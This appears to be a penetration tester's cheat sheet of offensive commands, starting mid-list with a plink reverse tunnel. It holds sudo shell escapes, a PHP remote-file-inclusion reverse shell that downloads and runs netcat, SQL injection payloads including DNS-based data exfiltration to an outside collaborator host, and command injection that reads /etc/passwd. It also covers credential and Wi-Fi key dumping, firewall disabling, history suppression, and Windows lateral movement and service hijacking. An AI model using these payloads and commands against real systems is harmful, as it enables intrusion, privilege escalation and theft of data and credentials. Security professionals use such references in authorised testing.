  -----------------------------------------------------------------------------------------------------------
  plink.exe \<user\>@\<ip or domain\> -pw \<password\> -P 22 -2 -4 -T -N -C -R 0.0.0.0:12345:127.0.0.1:3389
  -----------------------------------------------------------------------------------------------------------

Shell Escapes (Linux w/sudo)
============================

vi(m)
-----

  ------
  :!sh
  ------

  ----------------------------
  :set shell=/bin/bash:shell
  ----------------------------

nmap \--interactive
-------------------

  -----
  !sh
  -----

awk
---

  -------------------------------------------
  awk \'BEGIN {system(\\\"/bin/bash\\\")}\'
  -------------------------------------------

perl
----

  -------------------------------------
  perl -e \'exec \\\"/bin/bash\\\";\'
  -------------------------------------

find
----

  -----------------------------------------------------------------------
  find / -exec /usr/bin/awk \'BEGIN {system(\\\"/bin/bash\\\")}\' \\\\;
  -----------------------------------------------------------------------

X Server Hacks
==============

How to Run An Application As An Unprivileged User (i.e. WireShark)
------------------------------------------------------------------

This script will allow you to run an application as an unprivileged user

+-------------------------------------------------+
| \#!/bin/bash                                    |
|                                                 |
| \# Add the user to the X windows privilege list |
|                                                 |
| xhost +SI:localuser:**\<username\>**            |
|                                                 |
| \# Run the desired X app as the specified user  |
|                                                 |
| sudo -u **\<username\> \<command and args\>**   |
+-------------------------------------------------+

Kali Hacks
==========

Configure Wireshark to Run As a Non-Privileged User
---------------------------------------------------

These steps will create a group called wireshark that will be granted
permission to run WireShark. You will need to add a standard user to the
system and make them a member of the group.

+-----------------------------------------------------------------------+
| **root\@kali:\~\#** groupadd wireshark                                |
|                                                                       |
| **root\@kali:\~\#** chgrp wireshark /usr/bin/dumpcap                  |
|                                                                       |
| **root\@kali:\~\#** chmod 750 /usr/bin/dumpcap                        |
|                                                                       |
| **root\@kali:\~\#** setcap cap\_net\_raw,cap\_net\_admin=eip          |
| /usr/bin/dumpcap                                                      |
+-----------------------------------------------------------------------+

Configure Pure-FTP to Serve Files
---------------------------------

This script will create a user and group for pure-ftp as well restart
the service.

+---------------------------------------------------+
| \#!/bin/bash                                      |
|                                                   |
| groupadd ftpgroup\                                |
| useradd -g ftpgroup -d /dev/null -s /etc ftpuser\ |
| pure-pw useradd offsec -u ftpuser -d /ftphome\    |
| pure-pw mkdb\                                     |
| cd /etc/pure-ftpd/auth/\                          |
| ln -s ../conf/PureDB 60pdb\                       |
| mkdir -p /ftphome\                                |
| chown -R ftpuser:ftpgroup /ftphome/\              |
| /etc/init.d/pure-ftpd restart                     |
+---------------------------------------------------+

Useful Scripts
==============

Pull the Google Hacking Database (GHDB) Into a CSV File
-------------------------------------------------------

This will pull the GHDB down into a CSV file. You will need to replace
any "&quote;" and "&amp;" with regular characters. Perhaps I'll add that
after I know all the special characters that they use. This script uses
a Chrome User Agent and pauses for a random interval to try to look less
scripted.

+-----------------------------------------------------------------------+
| \#!/bin/bash                                                          |
|                                                                       |
| for ((i = 2; i\<=4299; i++)); do                                      |
|                                                                       |
| page=\"\$(wget \--header=\"accept-encoding: gzip\"                    |
| \--user-agent=\"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36       |
| (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\"                |
| https://www.exploit-db.com/ghdb/\$i/ -O - \| gunzip)\"                |
|                                                                       |
| desc=\"\$(echo \$page \| grep \"Google dork Description:\" \| awk -F  |
| \'\</strong\>\' \'{print \$2}\' \| awk -F \"\</td\>\" \'{print \$1}\' |
| \| sed -e \'s/\^\[\[:space:\]\]\*//\' -e                              |
| \'s/\[\[:space:\]\]\*\$//\')\"                                        |
|                                                                       |
| srch=\"\$(echo \$page \| grep \"Google search:\" \| awk -F            |
| \'rel=\"nofollow\"\>\' \'{print \$2}\' \| awk -F \"\</a\>\" \'{print  |
| \$1}\' \| sed -e \'s/\^\[\[:space:\]\]\*//\' -e                       |
| \'s/\[\[:space:\]\]\*\$//\')\"                                        |
|                                                                       |
| subm=\"\$(echo \$page \| grep \"Submited:\</strong\>\" \| awk -F      |
| \'\</strong\>\' \'{print \$4}\' \| awk -F \"\</td\>\" \'{print \$1}\' |
| \| sed -e \'s/\^\[\[:space:\]\]\*//\' -e                              |
| \'s/\[\[:space:\]\]\*\$//\')\"                                        |
|                                                                       |
| echo \"\\\"\$desc\\\", \\\"\$srch\\\", \\\"\$subm\\\"\" \>\> ghdb.csv |
|                                                                       |
| sleep \"\$(rand -M 30)\"                                              |
|                                                                       |
| done                                                                  |
+-----------------------------------------------------------------------+

Zone Transfer (Bash)
--------------------

This script will locate the NS servers and attempt to use the "host"
command to perform a zone transfer.

+-----------------------------------------------------------------------+
| \#!/bin/bash                                                          |
|                                                                       |
| if \[ -z \"\$1\" \]; then                                             |
|                                                                       |
| echo \"You must enter an argument\"                                   |
|                                                                       |
| else                                                                  |
|                                                                       |
| for nameserver in \$(dig -t NS +noall +answer \"\$1\" \| grep \"NS\"  |
| \| cut -f 5 \| sed -e \'s/\\.\*\$//\'); do                            |
|                                                                       |
| host -l \$1 \$nameserver \| grep \"has address\" \| cut -d \" \" -f   |
| 1,4                                                                   |
|                                                                       |
| done                                                                  |
|                                                                       |
| fi                                                                    |
+-----------------------------------------------------------------------+

PHP RFI Reverse Shell
---------------------

This can be used in a RFI/LFI to download nc.exe from the specified
server then run it.

+-----------------------------------------------------------------------+
| \<?php                                                                |
|                                                                       |
| file\_put\_contents(\"nc.exe\",                                       |
| fopen(\"http://**\<server\>**/nc.exe\", \'r\'));                      |
|                                                                       |
| shell\_exec(\"nc.exe -nv **\<server\>** **\<port\>** -e cmd.exe\");   |
|                                                                       |
| ?\>                                                                   |
+-----------------------------------------------------------------------+

Using exec() to change directories and run a file uploaded elsewhere.

  ----------------------------------------------------------------------------------
  \<?php exec(\'cd uploads && nc.exe -nv **\<server\> \<port\>** -e cmd.exe\');?\>
  ----------------------------------------------------------------------------------

Type Juggling
=============

PHP Loose Comparison
--------------------

-   [[https://www.php.net/manual/en/types.comparisons.php]{.underline}](https://www.php.net/manual/en/types.comparisons.php)

PHP String Conversions
----------------------

PHP duplicated the string conversion method used by Unix\'s strtod
command. Using this type of string conversion with Loose comparisons
could lead to type juggling.

-   [[https://www.php.net/manual/en/language.types.string.php\#language.types.string.conversion]{.underline}](https://www.php.net/manual/en/language.types.string.php#language.types.string.conversion)

-   [[http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html]{.underline}](http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html)

SQL Injection
=============

SQL Tests
---------

  or 1=1           \'or 1=1       \"or 1=1         or 1=1-            \'or 1=1-          \"or 1=1-
  ---------------- -------------- ---------------- ------------------ ------------------ -------------------
  or 1=1\#         \'or 1=1\#     \"or             1=1\#              or 1=1/\*          \'or 1=1/\*
  \"or 1=1/\*      or 1=1;%00     \'or 1=1;%00     \"or 1=1;%00       \'or\'             \'or
  \'or\'-          \'or-          or a=a           \'or a=a           \"or a=a           or a=a-
  \'or a=a-        \"or a=a-      or \'a\'=\'a\'   \'or \'a\'=\'a\'   \"or \'a\'=\'a\'   \')or(\'a\'=\'a\'
  \")\"a\"=\"a\"   \')\'a\'=\'a   \'or\"=\'        \' or 1=1\--       \" or 1=1\--       or 1=1\--
  \" or 1=1\#                                                                            

SQL Comment Formats
-------------------

### Microsoft SQL/PostgreSQL v1

  ------------
  \--comment
  ------------

### Microsoft SQL/PostgreSQL v1

  ---------------
  /\*comment\*/
  ---------------

### Oracle v1

  ------------
  \--comment
  ------------

### MySQL v1 (Note the space)

  -------------
  \-- comment
  -------------

### MySQL v2

  -----------
  \#comment
  -----------

### MySQL v3

  ---------------
  /\*comment\*/
  ---------------

SQL String Concatenation
------------------------

### Oracle & PostgreSQL

  --------------------
  \'foo\'\|\|\'bar\'
  --------------------

### MySQL

+-------------------------+
| \'foo\' \'bar\'         |
|                         |
| CONCAT(\'foo\',\'bar\') |
+-------------------------+

### Microsoft

  -----------------
  \'foo\'+\'bar\'
  -----------------

SQL Time Delays
---------------

### Oracle

  -----------------------------------------
  dbms\_pipe.receive\_message((\'a\'),10)
  -----------------------------------------

### Microsoft

  --------------------------
  WAITFOR DELAY \'0:0:10\'
  --------------------------

### PostgreSQL

  ----------------------
  SELECT pg\_sleep(10)
  ----------------------

### MySQL

  ------------------
  SELECT sleep(10)
  ------------------

SQL Conditional Time Delays
---------------------------

### Oracle

  ----------------------------------------------------------------------------------------------------------------------
  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN \'a\'\|\|dbms\_pipe.receive\_message((\'a\'),10) ELSE NULL END FROM dual
  ----------------------------------------------------------------------------------------------------------------------

### Microsoft

  ---------------------------------------------------
  IF (YOUR-CONDITION-HERE) WAITFOR DELAY \'0:0:10\'
  ---------------------------------------------------

### PostgreSQL

  ---------------------------------------------------------------------------------
  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg\_sleep(10) ELSE pg\_sleep(0) END
  ---------------------------------------------------------------------------------

### MySQL

  ------------------------------------------------
  SELECT IF(YOUR-CONDITION-HERE,sleep(10),\'a\')
  ------------------------------------------------

SQL DNS Lookup
--------------

### Oracle

+-----------------------------------------------------------------------+
| SELECT extractvalue(xmltype(\'\<?xml version=\"1.0\"                  |
| encoding=\"UTF-8\"?\>\<!DOCTYPE root \[ \<!ENTITY % remote SYSTEM     |
| \"http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/\"\>                |
| %remote;\]\>\'),\'/l\') FROM dual                                     |
|                                                                       |
| Or                                                                    |
|                                                                       |
| SELECT                                                                |
| UTL\_INADDR.get\_host\_address(\'YOUR-SUBDOMAIN-HERE.burpcollaborator |
| .net\')                                                               |
+-----------------------------------------------------------------------+

### Microsoft

  ---------------------------------------------------------------------------
  exec master..xp\_dirtree \'//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a\'
  ---------------------------------------------------------------------------

### PostgreSQL

  -------------------------------------------------------------------------------------
  copy (SELECT \'\') to program \'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net\'
  -------------------------------------------------------------------------------------

### MySQL (Windows only)

+-----------------------------------------------------------------------+
| LOAD\_FILE(\'\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\\\a\') |
|                                                                       |
| SELECT \... INTO OUTFILE                                              |
| \'\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a\'               |
+-----------------------------------------------------------------------+

SQL DNS Lookup w/Data Exfiltration
----------------------------------

### Oracle

  ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  SELECT extractvalue(xmltype(\'\<?xml version=\"1.0\" encoding=\"UTF-8\"?\>\<!DOCTYPE root \[ \<!ENTITY % remote SYSTEM \"http://\'\|\|(SELECT YOUR-QUERY-HERE)\|\|\'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/\"\> %remote;\]\>\'),\'/l\') FROM dual
  ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Microsoft

  -----------------------------------------------------------------------------------------------------------------------------------------------------
  declare \@p varchar(1024);set \@p=(SELECT YOUR-QUERY-HERE);exec(\'master..xp\_dirtree \"//\'+\@p+\'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a\"\')
  -----------------------------------------------------------------------------------------------------------------------------------------------------

### PostgreSQL

+-----------------------------------------------------------------------+
| create OR replace function f() returns void as \$\$                   |
|                                                                       |
| declare c text;                                                       |
|                                                                       |
| declare p text;                                                       |
|                                                                       |
| begin                                                                 |
|                                                                       |
| SELECT into p (SELECT YOUR-QUERY-HERE);                               |
|                                                                       |
| c := \'copy (SELECT \'\'\'\') to program \'\'nslookup                 |
| \'\|\|p\|\|\'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net\'\'\';         |
|                                                                       |
| execute c;                                                            |
|                                                                       |
| END;                                                                  |
|                                                                       |
| \$\$ language plpgsql security definer;                               |
|                                                                       |
| SELECT f();                                                           |
+-----------------------------------------------------------------------+

### MySQL (Windows only)

  ---------------------------------------------------------------------------------------------
  SELECT YOUR-QUERY-HERE INTO OUTFILE \'\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a\'
  ---------------------------------------------------------------------------------------------

SQL Database Enumeration Examples
---------------------------------

### Discover Database Version (Microsoft SQL, MySQL)

  --------------------------------------------------------------------------------
  http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,@\@version,6
  --------------------------------------------------------------------------------

### Discover Database Version v1 (Oracle)

  --------------------------------------------------------------------------------
  http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,v\$version,6
  --------------------------------------------------------------------------------

### Discover Database Version v2 (Oracle)

  --------------------------------------------------------------------------------------------
  http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,banner,6 FROM v\$version
  --------------------------------------------------------------------------------------------

### Discover Database Version v3 (Oracle)

  ----------------------------------------------------------------------------------------------
  http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,version,6 FROM v\$instance
  ----------------------------------------------------------------------------------------------

### Discover Database Version (PostgreSQL)

  -------------------------------------------------------------------------------
  http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,version(),6
  -------------------------------------------------------------------------------

### Discover Database User

  ----------------------------------------------------------------------------
  http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,user(),6
  ----------------------------------------------------------------------------

### Enumerating Table Names (MySQL, Microsoft SQL)

This example is injecting a "union all select" statement to place the
list of table names into column 5

  -----------------------------------------------------------------------------------------------------------------
  http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,table\_name,6 FROM information\_schema.tables
  -----------------------------------------------------------------------------------------------------------------

  --------------------------------------------------------------------------------
  \%\' and 1=0 union select null, table\_name from information\_schema.tables \#
  --------------------------------------------------------------------------------

### Enumerating Column Names of a Table (MySQL, Microsoft SQL)

This example is injecting a "union all select" statement to list the
column names of the supplied talle.

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  http://**\<server\>**/**\<somefile\>**.php?**\<somevariable\>**=**\<somevalue\>** union all select 1,2,3,4,column\_name,6 FROM information\_schema.columns where table\_name='**\<table\_name\>**'
  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

  -----------------------------------------------------------------------------------------------------------------
  \%\' and 1=0 union select null, column\_name from information\_schema.columns where table\_name = \'users\' \#"
  -----------------------------------------------------------------------------------------------------------------

### Enumerating Table Names (Oracle)

  -------------------------------------
  SELECT table\_name FROM all\_tables
  -------------------------------------

### Enumerating Column Names (Oracle)

  ----------------------------------------------------------------------------------------
  SELECT column\_name FROM all\_tab\_columns WHERE table\_name = \'**\<table\_name\>**\'
  ----------------------------------------------------------------------------------------

### Collecting Specific Information

  ------------------------------------------------
  \%\' UNION SELECT user, password from users \#
  ------------------------------------------------

### Error Based Blind Enumeration

#### Enumerate Database Name

  ------------------------------------------------------------------------
  1 AND ORD(MID((SELECT IFNULL(CAST(database() AS CHAR), 0x20)),1,1))\>1
  ------------------------------------------------------------------------

#### Enumerate Table Name

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------
  1 AND ORD(MID((SELECT IFNULL(CAST(table\_name AS CHAR),0x20) FROM information\_schema.tables WHERE table\_schema=database() ORDER BY table\_name LIMIT 0,1),1,1))\>1
  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------

#### Enumerate Column Name

  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  1 AND ORD(MID((SELECT IFNULL(CAST(column\_name AS CHAR),0x20) FROM information\_schema.columns WHERE table\_name=0x6775657374626f6f6b ORDER BY column\_name LIMIT 0,1),1,1))\>1
  ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#### Enumerate Field Value

Explaination:

-   ORD(string) - Returns the leftmost character in a string

-   MID(string, position, length) - Extracts a substring, returns 5th
    > position single character

-   IFNULL(expression1, expression2) - Returns 1st expression is not
    > NULL, otherwise returns 2nd

-   CAST() - Casts the string containing the column name to CHAR

-   0x20 is a space and the first printable ASCII character

-   LIMIT 0, 1 - Returns first single row.

This query will return true if the single character that is in the 5th
position of the name field in the first row of the guestbook table of
the dvwa database is greater than 1. The final number is increased until
the result is false. A false result, past 1, indicates that the value
was located. If the false result happens at 1, that means that the value
is NULL/non-existent.

  -------------------------------------------------------------------------------------------------------------
  1 AND ORD(MID((SELECT IFNULL(CAST(name AS CHAR),0x20) FROM dvwa.guestbook ORDER BY name LIMIT 0,1),5,1))\>1
  -------------------------------------------------------------------------------------------------------------

Linux Commands
==============

Disable Command History
-----------------------

  ----------------
  unset HISTFILE
  ----------------

Check Linux Distribution
------------------------

### Method 1

  ---------------------
  cat /etc/\*-release
  ---------------------

### Method 2

  -----------------
  Lsb\_release -a
  -----------------

Remove All Lines with non-ASCII Characters
------------------------------------------

  ------------------------------------------------------------------
  perl -nle \'print if m{\^\[\[:ascii:\]\]+\$}\' **\<inputfile\>**
  ------------------------------------------------------------------

Remove All Lines with ASCII Characters
--------------------------------------

  -------------------------------------------------------------------
  perl -nle \'print if !m{\^\[\[:ascii:\]\]+\$}\' **\<inputfile\>**
  -------------------------------------------------------------------

Convert From Windows(dos) to Unix File Format
---------------------------------------------

### dos2unix

  ---------------------------
  dos2unix **\<filename\>**
  ---------------------------

### vi(m)

+------------------------------------------------+
| :1,\$s/\^M//g                                  |
|                                                |
| :set ff=unix                                   |
|                                                |
| :w                                             |
|                                                |
| To enter "\^M" press **CTRL+V** then **Enter** |
+------------------------------------------------+

### awk

  -----------------------------------------------------------------------------
  awk \'{ sub(\"\\r\$\", \"\"); print }\' **\<winfile\>** \> **\<unixfile\>**
  -----------------------------------------------------------------------------

### perl

  -----------------------------------------------------------------
  perl -p -e \'s/\\r\$//\' \< **\<winfile\>** \> **\<unixfile\>**
  -----------------------------------------------------------------

### tr

  -----------------------------------------------------------
  tr -d \'\\15\\32\' \< **\<winfile\>** \> **\<unixfile\>**
  -----------------------------------------------------------

Dump Samba Credentials
----------------------

  -------------
  pdbdump -Lw
  -------------

  --------------------------
  pbtool **\<file\>** dump
  --------------------------

Execute Commands Without Spaces (Examples)
------------------------------------------

  ------------------------------------------------
  IFS=,;\`cat\<\<\<cat,/etc/passwd\`\
  cat\$IFS/etc/passwd\
  cat\${IFS}/etc/passwd\
  cat\</etc/passwd\
  {cat,/etc/passwd} OR {ls,-las,/var} with args\
  X=\$\'cat\\x20/etc/passwd\'&&\$X

  ------------------------------------------------

Windows Commands
================

PowerShell
----------

### Encoding Commands from File (Linux)

  --------------------------------------------------------
  iconv -f ASCII -t UTF-16LE **\<file\>** \| base64 -w 0
  --------------------------------------------------------

### Encoding Commands from Inline (Linux)

  --------------------------------------------------------------
  echo \"**\<command\>**\" \| iconv -t UTF-16LE \| base64 -w 0
  --------------------------------------------------------------

### Encoding Commands with Python

+-----------------------------------------------------+
| from base64 import b64encode                        |
|                                                     |
| b64encode(\'**\<command\>**\').encode(\'UTF-16LE\') |
+-----------------------------------------------------+

### Encoding Commands with Ruby

+--------------------------------------------------------------------+
| require \"base64\"                                                 |
|                                                                    |
| Base64.encode64(\'**\<command\>**\'.force\_encoding(\'UTF-16LE\')) |
+--------------------------------------------------------------------+

Checking for Access Level
-------------------------

### Check Username

  -----------------
  Echo %USERNAME%
  -----------------

### Use DIR to Check For Admin Rights

  ---------------------------
  dir \\\\**\<host\>**\\C\$
  ---------------------------

### Use AT to Check For Admin Rights

  ---------------------
  at \\\\**\<host\>**
  ---------------------

System Details
--------------

### Discover Domain (workstation)

  ------------------------
  net config workstation
  ------------------------

### Discover Domain (server)

  ------------------------
  net config workstation
  ------------------------

### View Domain Controller Name Via Registry

  ----------------------------------------------------------------------------------------------------
  reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Group Policy\\History\" /v DCName
  ----------------------------------------------------------------------------------------------------

### Check Patch Level

  -------------------------------------------------------
  wmic qfe get Caption,Description,HotFixID,InstalledOn
  -------------------------------------------------------

### Check for Specific Installed Path

  ------------------------------------------------------------------------------------------
  wmic qfe get Caption,Description,HotFixID,InstalledOn \| findstr /C:\"**\<kbnumber\>**\"
  ------------------------------------------------------------------------------------------

### Get Drive Details

  -------------------------------------------------------
  wmic logicaldisk get caption,description,providername
  -------------------------------------------------------

Firewall
--------

### Disable Firewall (Windows XP)

  -----------------------------------
  netsh firewall set opmode disable
  -----------------------------------

### Enable Firewall (Windows XP)

  ----------------------------------
  netsh firewall set opmode enable
  ----------------------------------

### Disable Firewall (Windows Vista, Requires Elevation, UAC)

  ------------------------------------------------
  netsh advfirewall set currentprofile state off
  ------------------------------------------------

### Enable Firewall (Windows Vista, Requires Elevation, UAC)

  -----------------------------------------------
  netsh advfirewall set currentprofile state on
  -----------------------------------------------

### Check Firewall Status (Windows Vista & Newer)

  ---------------------------------
  netsh advfirewall firewall dump
  ---------------------------------

### Check Firewall Status (Windows XP)

  ---------------------------
  netsh firewall show state
  ---------------------------

### Show Firewall Configuration (Windows XP)

  ----------------------------
  Netsh firewall show config
  ----------------------------

User & Group Commands
---------------------

### Current User Privileges

  --------------
  whoami /priv
  --------------

### Current User Groups

  ----------------
  whoami /groups
  ----------------

### User Details (local)

  ---------------------------
  net user **\<username\>**
  ---------------------------

### User Details (domain)

  -----------------------------------
  net user **\<username\>** /domain
  -----------------------------------

### Create a User

  -------------------------------------------------
  net user **\<username\>** **\<password\>** /ADD
  -------------------------------------------------

### Add a User to a Group

  --------------------------------------------------------
  net localgroup **\<groupname\>** **\<username\>** /add
  --------------------------------------------------------

### Find Domain Admins

  -------------------------------------
  net group \"Domain Admins\" /domain
  -------------------------------------

### Find Enterprise Admins

  ---------------------------------------
  net group "Enterprise Admins" /domain
  ---------------------------------------

### List Local Groups

  ----------------
  net localgroup
  ----------------

### List Local Group Members

  ----------------------------------
  net localgroup **\<groupname\>**
  ----------------------------------

### List Local Password Policy

  --------------
  net accounts
  --------------

### List Domain Password Policy

  ----------------------
  net accounts /domain
  ----------------------

Command Execution
-----------------

### WMIC Execute a Command (Admin)

  -----------------------------------------------------------------
  wmic /node:"**\<host\>**" process call create "**\<program\>**"
  -----------------------------------------------------------------

### PowerShell Execute a Command (Admin, WinRM, Port 5985)

  ----------------------------------------------------------------------------
  Invoke-Command -ComputerName **\<host\>** -ScriptBlock { **\<command\>** }
  ----------------------------------------------------------------------------

### PowerSploit Execute a Command (Admin, Non-Bind)

  ------------------------------------------------------------------------------------------------------------
  Invoke-WmiCommand -ComputerName **\<target\>** -Payload { **\<command\>** } \| select -exp "PayloadOutput"
  ------------------------------------------------------------------------------------------------------------

### PowerShell Execution of SCT File Using .NET Assemblies

+-----------------------------------------------------------------------+
| \[Reflection.Assembly\]::LoadWithPartialName(\'Microsoft.JScript\');  |
|                                                                       |
| \[Microsoft.Jscript.Eval\]::JScriptEvaluate(\'GetObject(\"script:**\< |
| SCT\_URL\>**\").Exec()\',\[Microsoft.JScript.Vsa.VsaEngine\]::CreateE |
| ngine());                                                             |
+-----------------------------------------------------------------------+

Lateral Movement
----------------

### Create Service w/WINRM.EXE

+-----------------------------------------------------------------------+
| winrm invoke Create wmicimv2/Win32\_Service                           |
| @{Name=\"**\<name\>**\";DisplayName=\"**\<name\>**\";PathName=\"**\<c |
| ommand\>**\"}                                                         |
| -r:http://**\<hostname\>**:5985                                       |
|                                                                       |
| winrm invoke StartService wmicimv2/Win32\_Service?Name=**\<name\>**   |
| -r:http://**\<hostname\>**:5985                                       |
+-----------------------------------------------------------------------+

Processes
---------

### PowerShell - Get-Process

  -------------
  Get-Process
  -------------

### TaskList List Processes

  -----------------------------
  tasklist /v /S **\<host\>**
  -----------------------------

### TaskList Kill Processes

  ----------------------------------------------
  tasklist /S **\<host\>** /PID **\<pid\>** /F
  ----------------------------------------------

### Find a Specific Processes Information

  ------------------------------------------------
  tasklist \| findstr /i "**\<process\_name\>**"
  ------------------------------------------------

### WMIC List Processes - Full

  ---------------------------------------------
  wmic /node:"**\<host\>**" process list full
  ---------------------------------------------

### WMIC List Processes - Brief

  ----------------------------------------------
  wmic /node:"**\<host\>**" process list brief
  ----------------------------------------------

### WMIC Kill Process by PID

  ----------------------------------------------------------------------------
  wmic /node:"**\<host\>**" where (ProcessID = "**\<PID\>**") call terminate
  ----------------------------------------------------------------------------

### WMIC Kill Process by Name

  ---------------------------------------------------------------------------
  wmic /node:"**\<host\>**" where (Name = "**\<PE Name\>**") call terminate
  ---------------------------------------------------------------------------

Services
--------

### List Services

[[https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx]{.underline}](https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx)

  -----------------------------------
  sc query type= service state= all
  -----------------------------------

### List Services (Old Way)

  -----------
  net start
  -----------

### Find Services with Unquoted Paths (wmic)

  ---------------------------------------------------------------------------------------------------------------------------------------
  wmic service get name,displayname,pathname,startmode \|findstr /i \"Auto\" \|findstr /i /v \"C:\\Windows\\\\\" \|findstr /i /v \"\"\"
  ---------------------------------------------------------------------------------------------------------------------------------------

### Find Services with Unquoted Paths (PowerShell)

  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  Get-WmiObject win32\_service \| select name,pathname \| Where-Object -Filter { \$\_.pathname -notlike \"\`\"\*\`\"\*\" -and \$\_.pathname -notlike \"C:\\WINDOWS\\\*\" -and -\$\_.pathname }
  ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Enable Service (Admin or User Modifiable Service)

  -----------------------------------------
  sc config **\<service\>** start= demand
  -----------------------------------------

### Start Service (Admin or User Modifiable Service)

  ---------------------------
  net start **\<service\>**
  ---------------------------

### Stop Service (Admin or User Modifiable Service)

  --------------------------
  net stop **\<service\>**
  --------------------------

### Create a Service (Admin, Service PE)

  ------------------------------------------------------------------
  sc \\\\**\<host\>** create **\<name\>** binpath= **\<program\>**
  ------------------------------------------------------------------

**Note:** You can create a service that runs CMD with the /C or /K that
specified another command. Windows will kill the CMD but leave the
program it runs active.

### Edit a Writable Service (use accesschk.exe to find one)

+------------------------------------------------------------------------+
| \# Change the command                                                  |
|                                                                        |
| sc config **\<servicename\>** binpath= "**\<command and arguments\>**" |
|                                                                        |
| \# Change the User the service runs as                                 |
|                                                                        |
| sc config **\<servicename\>** obj= ".\\LocalSystem" password= ""       |
+------------------------------------------------------------------------+

Scheduled Tasks (Admin)
-----------------------

### Schedule a Task with AT

+---------------------------------------+
| **Check the time with:**              |
|                                       |
| net time \\\\**\<host\>**             |
|                                       |
| **Schedule the task with:**           |
|                                       |
| at \\\\**\<host\> HH:MM \<command\>** |
+---------------------------------------+

### Schedule a Task with SCHTASKS

+-----------------------------------------------------------------------+
| **Create the task:**                                                  |
|                                                                       |
| schtasks /create /tn **\<name\>** /tr **\<program\>** /sc once /st    |
| 00:00 /S **\<host\>** /RU System                                      |
|                                                                       |
| **Run the task:**                                                     |
|                                                                       |
| schtasks /run /tn **\<name\>** /S **\<host\>**                        |
+-----------------------------------------------------------------------+

Network Discovery
-----------------

### PowerShell - List Connections

  ----------------------
  Get-NetTCPConnection
  ----------------------

### List Established Connections

  -----------------------------------------------
  netstat -anp **\[tcp\|udp\]** \| find "ESTAB"
  -----------------------------------------------

### List Listening Ports

  ------------------------------------------------
  netstat -anp **\[tcp\|udp\]** \| find "LISTEN"
  ------------------------------------------------

### List Open Ports with PIDs

  --------------
  netstat -ano
  --------------

### Show IP Addressing Configuration Details

  -----------------------------------
  netsh interface ip show addresses
  -----------------------------------

### Show IP Routing Configuration Details

  -------------------------------
  netsh interface ip show route
  -------------------------------

### Show IP Neighbor Details

  -----------------------------------
  netsh interface ip show neighbors
  -----------------------------------

### ARP Table List

  --------
  arp -a
  --------

### Display DNS Cache

  ----------------------
  ipconfig /displaydns
  ----------------------

### Display Ports with Connections and Processes

  ---------------
  netstat -nabo
  ---------------

### Display Routing Table (netstat)

  ------------
  netstat -r
  ------------

### Display Routing Table (route)

  -------------
  route print
  -------------

### Find Specific Listening Port

  --------------------------------------
  netstat -na \| findstr :**\<port\>**
  --------------------------------------

### Find Listening Ports and PIDs

  -----------------------------------
  netstat -nao \| findstr LISTENING
  -----------------------------------

### Find Hosts in the Same Workgroup

  ----------
  net view
  ----------

### Find Hosts in Another Domain

  ---------------------------------
  net view /domain:**\<domain\>**
  ---------------------------------

### Find Visible Domains

  ------------------
  net view /domain
  ------------------

### Find Domain Controllers

  ----------------------------------------
  net group "Domain Controllers" /domain
  ----------------------------------------

### Get Domain/Domain Controller Details

  --------------------
  wmic ntdomain list
  --------------------

### List HOSTS File Contents

  ----------------------------------------------
  type %WINDIR%\\System32\\drivers\\etc\\hosts
  ----------------------------------------------

Windows Wireless Networking
---------------------------

### List Saved Wireless Profiles

  --------------------------
  netsh wlan show profiles
  --------------------------

### Export Saved Wireless Profile

  ----------------------------------------------
  netsh wlan export profile folder=. key=clear
  ----------------------------------------------

### Add Specified Wireless Profile

  --------------------------------------------------------------------------------------------------------------
  netsh wlan set hostednetwork ssid=**\<ssid\>** key=**\<passphrase\>** keyUsage=**\[persistent\|temporary\]**
  --------------------------------------------------------------------------------------------------------------

### Start or Stop Wireless Network

  ----------------------------------------------
  netsh wlan **\[start\|stop\]** hostednetwork
  ----------------------------------------------

### Enable or Disable Wireless Network

  -----------------------------------------------------------
  netsh wlan set hostednetwork mode=**\[allow\|disallow\]**
  -----------------------------------------------------------

Shares
------

### Turn Default Share On

  ----------------------------------
  net share **\<(C\$\|ADMIN\$)\>**
  ----------------------------------

Registry Enumeration
--------------------

### Locate \<string\> In Registry (i.e. password)

  --------------------------------------------------------------
  reg query **\[HKLM\|HKCU\]** /f **\<string\>** /t REG\_SZ /s
  --------------------------------------------------------------

### Always Install Elevated Check

  --------------------------------------------------------------------------------------------------------
  reg query **\[HKLM\|HKCU\]**\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated
